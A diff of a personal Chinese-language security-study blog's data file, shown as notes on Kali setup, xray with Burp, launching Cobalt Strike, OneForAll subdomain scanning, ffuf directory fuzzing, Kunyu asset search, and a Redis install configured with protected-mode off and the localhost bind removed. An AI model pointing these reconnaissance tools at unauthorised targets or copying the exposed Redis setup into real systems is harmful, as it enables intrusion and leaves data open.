-<h3 id="参考的一些博客"><a href="#参考的一些博客" class="headerlink" title="参考的一些博客"></a>参考的一些博客</h3><p><a href="https://blog.csdn.net/qq_39670065/article/details/107366077?spm=1001.2014.3001.5501">upload-labs通关记录</a></p>
-<p><a href="https://xz.aliyun.com/t/4029#toc-15">Upload-labs 20关通关笔记</a></p>
-<p><a href="https://wiki.wgpsec.org/knowledge/web/fileuploads.html">狼组公开文库</a></p>
-<p><a href="https://www.cnblogs.com/luolaobiao/p/9917878.html">常见的文件上传绕过和文件解析漏洞</a></p>
-]]></content>
-      <categories>
-        <category>文件上传</category>
-      </categories>
-      <tags>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>端口那些事</title>
     <url>/2021/06/28/%E7%AB%AF%E5%8F%A3%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
     <content><![CDATA[<p>想要开放端口，要先去了解防火墙状态和网络命令</p>
@@ -1446,56 +1449,6 @@
 <h3 id="允许某一网段的ip进行访问"><a href="#允许某一网段的ip进行访问" class="headerlink" title="允许某一网段的ip进行访问"></a>允许某一网段的ip进行访问</h3><p><code>ufw allow from 10.0.0.0/8</code></p>
 <h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/realjh/article/details/82048492">Linux下Centos7对外开放端口</a></p>
 <p><a href="https://www.cnblogs.com/heqiuyong/p/10460150.html">Centos7开放及查看端口</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>第二周</title>
-    <url>/2021/09/15/%E7%AC%AC%E4%BA%8C%E5%91%A8-1/</url>
-    <content><![CDATA[<h2 id="9-13"><a href="#9-13" class="headerlink" title="9.13"></a>9.13</h2><p>kali中java切换版本命令：update-alternatives  –config  java</p>
-<p>sudo update-alternatives –install “/usr/bin/java” “java” “/usr/bin/jdk1.8.0_301/bin/java” 1<br>sudo update-alternatives –install “/usr/bin/javac” “javac” “/usr/bin/jdk1.8.0_301/bin/javac” 1<br>sudo update-alternatives –install “/usr/bin/javaws” “javaws” “/usr/bin/jdk1.8.0_301/bin/javaws” 1</p>
-<p>sudo update-alternatives –set java /usr/bin/jdk1.8.0_301/bin/java<br>sudo update-alternatives –set java /usr/bin/jdk1.8.0_301/bin/java</p>
-<p>sudo update-alternatives –set javac /usr/bin/jdk1.8.0_301/bin/javac</p>
-<p>sudo update-alternatives –set javac /usr/bin/jdk1.8.0_301/bin/javac</p>
-<p>sudo update-alternatives –set javaws /usr/bin/jdk1.8.0_301/bin/javaws</p>
-<p>sudo update-alternatives –set javaws /usr/bin/jdk1.8.0_301/bin/javaws</p>
-<p>burp位置/usr/bin/burp/</p>
-<p>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</p>
-<p>Exception in thread “main” java.lang.UnsatisfiedLinkError: /usr/bin/jdk1.8.0_301      /jre/lib/i386/libawt_xawt.so: libXext.so.6: 无法打开共享对象文件: 没有那个文件或目录</p>
-<blockquote>
-<p>这里的报错解决了，是因为/etc/profile下误删了一点代码</p>
-</blockquote>
-<p>sudo apt-get install libxtst-dev 依赖错误，安装失败</p>
-<h2 id="9-14"><a href="#9-14" class="headerlink" title="9.14"></a>9.14</h2><h3 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h3><p>HTML文件输出 –html-output xray-testphp.html</p>
-<p><code> .\xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output test1.html</code></p>
-<p>开burp代理</p>
-<p><img src="https://i.loli.net/2021/09/15/EjCZmTldnzHKQUG.png" alt="image-20210914122527496"></p>
-<p>原理：在利用burpsuite抓包分析页面的时候，所有的数据都会通过Passive Scan Client插件转发到设置的本地7777端口上，也就是xray上，然后xray会自动挖掘所有转发过来的流量信息并查找到漏洞记录在html文件中。<br> 这里还可以限定转发出去的数据包类型</p>
-<h3 id="cs"><a href="#cs" class="headerlink" title="cs"></a>cs</h3><p>启动客户端<code>java -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar</code></p>
-<h3 id="oneforall-fuff-kunyu"><a href="#oneforall-fuff-kunyu" class="headerlink" title="oneforall+fuff+kunyu"></a>oneforall+fuff+kunyu</h3><h4 id="oneforall"><a href="#oneforall" class="headerlink" title="oneforall"></a>oneforall</h4><p>子域名扫描</p>
-<p><code>python3 oneforall.py --target 网站域名 run</code></p>
-<p>输出的文件在result目录下</p>
-<p><a href="https://blog.csdn.net/weixin_41598660/article/details/106069680">OneForAll子域名工具</a></p>
-<h4 id="ffuf"><a href="#ffuf" class="headerlink" title="ffuf"></a>ffuf</h4><p>网站模糊测试</p>
-<h5 id="go环境安装"><a href="#go环境安装" class="headerlink" title="go环境安装"></a>go环境安装</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget -c https:&#x2F;&#x2F;storage.googleapis.com&#x2F;golang&#x2F;go1.8.3.linux-amd64.tar.gz</span><br><span class="line"></span><br><span class="line">#解压到&#x2F;usr&#x2F;local目录下</span><br><span class="line">tar -C &#x2F;usr&#x2F;local&#x2F; -xzvf go1.8.3.linux-amd64.tar.gz </span><br><span class="line"></span><br><span class="line">#在&#x2F;etc&#x2F;profile中配置环境变量并更新文件</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;go&#x2F;bin</span><br><span class="line">source &#x2F;etc&#x2F;profile &#x2F;&#x2F;更新</span><br><span class="line"></span><br><span class="line">go version</span><br><span class="line"></span><br><span class="line">#或者通过创建软链接的方式安装</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;ggq89&#x2F;article&#x2F;details&#x2F;82682171</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>由于go版本太低了，又重新安装了1.16</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/09/15/dkwAN5bqEPlMgoi.png" alt="image-20210915210358116"></p>
-<p>无论使用proxychains4或是直接go get都无法访问</p>
-<p>百度解决，换个代理<code>go env -w GOPROXY=https://goproxy.cn</code></p>
-<p><img src="https://i.loli.net/2021/09/15/BFVgStXjpwx6Rru.png" alt="image-20210915210528400"></p>
-<h5 id="扫目录"><a href="#扫目录" class="headerlink" title="扫目录"></a>扫目录</h5><p><code>ffuf -c -w /xxx/xxx/字典位置 -u http://ip/FUZZ</code></p>
-<p><a href="https://www.cnblogs.com/secxue/p/14617343.html">ffuf 基础食用指南</a>             </p>
-<p><a href="https://github.com/ffuf/ffuf">https://github.com/ffuf/ffuf</a></p>
-<h4 id="kunyu"><a href="#kunyu" class="headerlink" title="kunyu"></a>kunyu</h4><p>zoomeye命令行版，企业资产收集</p>
-<p><code>kunyu console</code></p>
-<p><img src="https://i.loli.net/2021/09/15/BiM7AWE1p62INml.png" alt="image-20210914195509396"></p>
-<p><a href="https://github.com/knownsec/Kunyu">https://github.com/knownsec/Kunyu</a></p>
-<h4 id="proxychains-ng"><a href="#proxychains-ng" class="headerlink" title="proxychains-ng"></a>proxychains-ng</h4><p>linux中代理工具</p>
-<p><a href="https://www.cnblogs.com/yizhixue-hx/p/12819364.html">kali 安装 proxychains-ng (proxychains4)</a></p>
-<h2 id="9-15"><a href="#9-15" class="headerlink" title="9.15"></a>9.15</h2><h4 id="Redis重新安装"><a href="#Redis重新安装" class="headerlink" title="Redis重新安装"></a>Redis重新安装</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-4.0.11.tar.gz</span><br><span class="line">tar -zxvf redis-4.0.11.tar.gz </span><br><span class="line">cd redis-4.0.11 </span><br><span class="line">make &#x2F;&#x2F;编译</span><br><span class="line">cd src</span><br><span class="line">vim redis.conf</span><br><span class="line">#进行注释或修改以下内容</span><br><span class="line"># bind 127.0.0.1 &#x2F;&#x2F;允许所有网络访问</span><br><span class="line">protected-mode no &#x2F;&#x2F;修改运行时不受保护</span><br><span class="line">daemonize yes &#x2F;&#x2F;修改为守护进程&#x2F;后台程序</span><br><span class="line">#运行</span><br><span class="line"> .&#x2F;redis-server &#x2F;&#x2F;运行redis，</span><br><span class="line">这种方式会因为关闭页面而直接关闭，所以可以添加开机自启脚本https:&#x2F;&#x2F;www.cnblogs.com&#x2F;williamjie&#x2F;p&#x2F;9370196.html</span><br><span class="line">或者在&#x2F;etc&#x2F;profile中配置环境变量https:&#x2F;&#x2F;www.cnblogs.com&#x2F;newloft&#x2F;p&#x2F;13066862.html</span><br><span class="line"></span><br><span class="line"># 连接其他主机</span><br><span class="line">redis-cli -h ip -p port</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/09/15/O34g9PVY8BLubpE.png" alt="image-20210915204449354"></p>
-<h4 id="daili池搭建"><a href="#daili池搭建" class="headerlink" title="daili池搭建"></a>daili池搭建</h4><p><a href="https://github.com/Python3WebSpider/ProxyPool">https://github.com/Python3WebSpider/ProxyPool</a></p>
 ]]></content>
   </entry>
   <entry>
@@ -1546,6 +1499,56 @@
 <p><a href="https://www.cnblogs.com/yizhixue-hx/p/12819364.html">kali 安装 proxychains-ng (proxychains4)</a></p>
 <h2 id="9-15"><a href="#9-15" class="headerlink" title="9.15"></a>9.15</h2><h4 id="Redis重新安装"><a href="#Redis重新安装" class="headerlink" title="Redis重新安装"></a>Redis重新安装</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-4.0.11.tar.gz</span><br><span class="line">tar -zxvf redis-4.0.11.tar.gz </span><br><span class="line">cd redis-4.0.11 </span><br><span class="line">make &#x2F;&#x2F;编译</span><br><span class="line">cd src</span><br><span class="line">vim redis.conf</span><br><span class="line">#进行注释或修改以下内容</span><br><span class="line"># bind 127.0.0.1 &#x2F;&#x2F;允许所有网络访问</span><br><span class="line">protected-mode no &#x2F;&#x2F;修改运行时不受保护</span><br><span class="line">daemonize yes &#x2F;&#x2F;修改为守护进程&#x2F;后台程序</span><br><span class="line">#运行</span><br><span class="line"> .&#x2F;redis-server &#x2F;&#x2F;运行redis，</span><br><span class="line">这种方式会因为关闭页面而直接关闭，所以可以添加开机自启脚本https:&#x2F;&#x2F;www.cnblogs.com&#x2F;williamjie&#x2F;p&#x2F;9370196.html</span><br><span class="line">或者在&#x2F;etc&#x2F;profile中配置环境变量https:&#x2F;&#x2F;www.cnblogs.com&#x2F;newloft&#x2F;p&#x2F;13066862.html</span><br><span class="line"></span><br><span class="line"># 连接其他主机</span><br><span class="line">redis-cli -h ip -p port</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p><img src="https://i.loli.net/2021/09/15/XOIL3NGqtYKHRvp.png" alt="image-20210915204449354"></p>
+<h4 id="daili池搭建"><a href="#daili池搭建" class="headerlink" title="daili池搭建"></a>daili池搭建</h4><p><a href="https://github.com/Python3WebSpider/ProxyPool">https://github.com/Python3WebSpider/ProxyPool</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>第二周</title>
+    <url>/2021/09/15/%E7%AC%AC%E4%BA%8C%E5%91%A8-1/</url>
+    <content><![CDATA[<h2 id="9-13"><a href="#9-13" class="headerlink" title="9.13"></a>9.13</h2><p>kali中java切换版本命令：update-alternatives  –config  java</p>
+<p>sudo update-alternatives –install “/usr/bin/java” “java” “/usr/bin/jdk1.8.0_301/bin/java” 1<br>sudo update-alternatives –install “/usr/bin/javac” “javac” “/usr/bin/jdk1.8.0_301/bin/javac” 1<br>sudo update-alternatives –install “/usr/bin/javaws” “javaws” “/usr/bin/jdk1.8.0_301/bin/javaws” 1</p>
+<p>sudo update-alternatives –set java /usr/bin/jdk1.8.0_301/bin/java<br>sudo update-alternatives –set java /usr/bin/jdk1.8.0_301/bin/java</p>
+<p>sudo update-alternatives –set javac /usr/bin/jdk1.8.0_301/bin/javac</p>
+<p>sudo update-alternatives –set javac /usr/bin/jdk1.8.0_301/bin/javac</p>
+<p>sudo update-alternatives –set javaws /usr/bin/jdk1.8.0_301/bin/javaws</p>
+<p>sudo update-alternatives –set javaws /usr/bin/jdk1.8.0_301/bin/javaws</p>
+<p>burp位置/usr/bin/burp/</p>
+<p>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</p>
+<p>Exception in thread “main” java.lang.UnsatisfiedLinkError: /usr/bin/jdk1.8.0_301      /jre/lib/i386/libawt_xawt.so: libXext.so.6: 无法打开共享对象文件: 没有那个文件或目录</p>
+<blockquote>
+<p>这里的报错解决了，是因为/etc/profile下误删了一点代码</p>
+</blockquote>
+<p>sudo apt-get install libxtst-dev 依赖错误，安装失败</p>
+<h2 id="9-14"><a href="#9-14" class="headerlink" title="9.14"></a>9.14</h2><h3 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h3><p>HTML文件输出 –html-output xray-testphp.html</p>
+<p><code> .\xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output test1.html</code></p>
+<p>开burp代理</p>
+<p><img src="https://i.loli.net/2021/09/15/EjCZmTldnzHKQUG.png" alt="image-20210914122527496"></p>
+<p>原理：在利用burpsuite抓包分析页面的时候，所有的数据都会通过Passive Scan Client插件转发到设置的本地7777端口上，也就是xray上，然后xray会自动挖掘所有转发过来的流量信息并查找到漏洞记录在html文件中。<br> 这里还可以限定转发出去的数据包类型</p>
+<h3 id="cs"><a href="#cs" class="headerlink" title="cs"></a>cs</h3><p>启动客户端<code>java -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar</code></p>
+<h3 id="oneforall-fuff-kunyu"><a href="#oneforall-fuff-kunyu" class="headerlink" title="oneforall+fuff+kunyu"></a>oneforall+fuff+kunyu</h3><h4 id="oneforall"><a href="#oneforall" class="headerlink" title="oneforall"></a>oneforall</h4><p>子域名扫描</p>
+<p><code>python3 oneforall.py --target 网站域名 run</code></p>
+<p>输出的文件在result目录下</p>
+<p><a href="https://blog.csdn.net/weixin_41598660/article/details/106069680">OneForAll子域名工具</a></p>
+<h4 id="ffuf"><a href="#ffuf" class="headerlink" title="ffuf"></a>ffuf</h4><p>网站模糊测试</p>
+<h5 id="go环境安装"><a href="#go环境安装" class="headerlink" title="go环境安装"></a>go环境安装</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget -c https:&#x2F;&#x2F;storage.googleapis.com&#x2F;golang&#x2F;go1.8.3.linux-amd64.tar.gz</span><br><span class="line"></span><br><span class="line">#解压到&#x2F;usr&#x2F;local目录下</span><br><span class="line">tar -C &#x2F;usr&#x2F;local&#x2F; -xzvf go1.8.3.linux-amd64.tar.gz </span><br><span class="line"></span><br><span class="line">#在&#x2F;etc&#x2F;profile中配置环境变量并更新文件</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;go&#x2F;bin</span><br><span class="line">source &#x2F;etc&#x2F;profile &#x2F;&#x2F;更新</span><br><span class="line"></span><br><span class="line">go version</span><br><span class="line"></span><br><span class="line">#或者通过创建软链接的方式安装</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;ggq89&#x2F;article&#x2F;details&#x2F;82682171</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>由于go版本太低了，又重新安装了1.16</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/09/15/dkwAN5bqEPlMgoi.png" alt="image-20210915210358116"></p>
+<p>无论使用proxychains4或是直接go get都无法访问</p>
+<p>百度解决，换个代理<code>go env -w GOPROXY=https://goproxy.cn</code></p>
+<p><img src="https://i.loli.net/2021/09/15/BFVgStXjpwx6Rru.png" alt="image-20210915210528400"></p>
+<h5 id="扫目录"><a href="#扫目录" class="headerlink" title="扫目录"></a>扫目录</h5><p><code>ffuf -c -w /xxx/xxx/字典位置 -u http://ip/FUZZ</code></p>
+<p><a href="https://www.cnblogs.com/secxue/p/14617343.html">ffuf 基础食用指南</a>             </p>
+<p><a href="https://github.com/ffuf/ffuf">https://github.com/ffuf/ffuf</a></p>
+<h4 id="kunyu"><a href="#kunyu" class="headerlink" title="kunyu"></a>kunyu</h4><p>zoomeye命令行版，企业资产收集</p>
+<p><code>kunyu console</code></p>
+<p><img src="https://i.loli.net/2021/09/15/BiM7AWE1p62INml.png" alt="image-20210914195509396"></p>
+<p><a href="https://github.com/knownsec/Kunyu">https://github.com/knownsec/Kunyu</a></p>
+<h4 id="proxychains-ng"><a href="#proxychains-ng" class="headerlink" title="proxychains-ng"></a>proxychains-ng</h4><p>linux中代理工具</p>
+<p><a href="https://www.cnblogs.com/yizhixue-hx/p/12819364.html">kali 安装 proxychains-ng (proxychains4)</a></p>
+<h2 id="9-15"><a href="#9-15" class="headerlink" title="9.15"></a>9.15</h2><h4 id="Redis重新安装"><a href="#Redis重新安装" class="headerlink" title="Redis重新安装"></a>Redis重新安装</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-4.0.11.tar.gz</span><br><span class="line">tar -zxvf redis-4.0.11.tar.gz </span><br><span class="line">cd redis-4.0.11 </span><br><span class="line">make &#x2F;&#x2F;编译</span><br><span class="line">cd src</span><br><span class="line">vim redis.conf</span><br><span class="line">#进行注释或修改以下内容</span><br><span class="line"># bind 127.0.0.1 &#x2F;&#x2F;允许所有网络访问</span><br><span class="line">protected-mode no &#x2F;&#x2F;修改运行时不受保护</span><br><span class="line">daemonize yes &#x2F;&#x2F;修改为守护进程&#x2F;后台程序</span><br><span class="line">#运行</span><br><span class="line"> .&#x2F;redis-server &#x2F;&#x2F;运行redis，</span><br><span class="line">这种方式会因为关闭页面而直接关闭，所以可以添加开机自启脚本https:&#x2F;&#x2F;www.cnblogs.com&#x2F;williamjie&#x2F;p&#x2F;9370196.html</span><br><span class="line">或者在&#x2F;etc&#x2F;profile中配置环境变量https:&#x2F;&#x2F;www.cnblogs.com&#x2F;newloft&#x2F;p&#x2F;13066862.html</span><br><span class="line"></span><br><span class="line"># 连接其他主机</span><br><span class="line">redis-cli -h ip -p port</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/09/15/O34g9PVY8BLubpE.png" alt="image-20210915204449354"></p>
 <h4 id="daili池搭建"><a href="#daili池搭建" class="headerlink" title="daili池搭建"></a>daili池搭建</h4><p><a href="https://github.com/Python3WebSpider/ProxyPool">https://github.com/Python3WebSpider/ProxyPool</a></p>
 ]]></content>
   </entry>
